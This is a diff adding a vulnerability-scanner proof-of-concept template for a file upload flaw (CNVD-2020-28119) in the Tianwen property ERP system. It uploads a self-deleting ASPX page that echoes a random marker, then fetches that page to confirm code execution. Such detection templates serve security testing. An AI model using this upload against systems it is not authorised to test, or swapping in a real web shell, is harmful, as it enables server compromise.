@@ -1,0 +1,42 @@
+name: Tianwen_ERP_system_FileUpload_CNVD_2020_28119
+transport: http
+set:
+  var_str2: randomLowercase(4)
+  var_enbs4str1: base64(str2)
+detail:
+  dock: body="天问物业ERP系统"
+  product: Tianwen ERP system
+  homepage: http://www.tw369.com/
+  impact: There is a file upload vulnerability in the ERP management platform /HM/M_Main/uploadfile.aspx
+    of Chengdu Tianwen Internet Technology Co., Ltd., and attackers can use the vulnerability
+    to upload malicious files to obtain server permissions.
+  description: Tianwen ERP system
+rules:
+  r1:
+    method: POST
+    path: /HM/M_Main/uploadfile.aspx
+    follow_redirects: true
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytKnDdPq6SMXufwyT
+    body: "------WebKitFormBoundarytKnDdPq6SMXufwyT\r\nContent-Disposition: form-data;\
+      \ name=\"__VIEWSTATE\"\r\n\r\n/wEPDwUKLTg1NDU3MTA4OQ9kFgICAQ8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRk70CKfgUcso35StfmoNB/ObwwU8W4qvmgqa52HxmqsU0=\r\
+      \n------WebKitFormBoundarytKnDdPq6SMXufwyT\r\nContent-Disposition: form-data;\
+      \ name=\"__VIEWSTATEGENERATOR\"\r\n\r\nDE1005D5\r\n------WebKitFormBoundarytKnDdPq6SMXufwyT\r\
+      \nContent-Disposition: form-data; name=\"__EVENTVALIDATION\"\r\n\r\n/wEdAAIk02sIXo/TRIPUygBB64GvmW/ynBkkkA2xI95ik8Vs4GXPPWvIYnA84468jdc5Wr+nrufsSY+RKtcm7vKIotDs\r\
+      \n------WebKitFormBoundarytKnDdPq6SMXufwyT\r\nContent-Disposition: form-data;\
+      \ name=\"BtnSave\"\r\n\r\n确定上传\r\n------WebKitFormBoundarytKnDdPq6SMXufwyT\r\
+      \nContent-Disposition: form-data; name=\"upload_img\"; filename=\"1.aspx\"\r\
+      \nContent-Type: application/octet-stream\r\n\r\n<%@Page Language=\"C#\"%>\r\n\
+      <%Response.Write(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(\"\
+      {{var_enbs4str1}}\"))); System.IO.File.Delete(Request.PhysicalPath);%>\r\n\r\
+      \n------WebKitFormBoundarytKnDdPq6SMXufwyT\r\n"
+    output:
+      search_shell_url: r'\\(\'(?P<shell_url>.*)\'\\)'.bsubmatch(response.body)
+      var_shell_url: search_shell_url['shell_url']
+    expression: response.status == 200 && response.body.bcontains(b'UploadCallBack')
+  r2:
+    method: GET
+    path: '{{var_shell_url}}'
+    follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(bytes(var_str2))
+expression: r1() && r2()
